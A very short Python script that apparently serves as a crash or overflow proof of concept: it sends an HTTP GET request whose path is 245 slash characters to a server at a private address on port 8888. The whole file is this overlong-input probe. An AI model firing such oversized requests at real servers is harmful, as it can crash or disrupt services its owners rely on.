from requests import get

buff = '/' * 245
get('http://192.168.245.131:8888/' + buff)
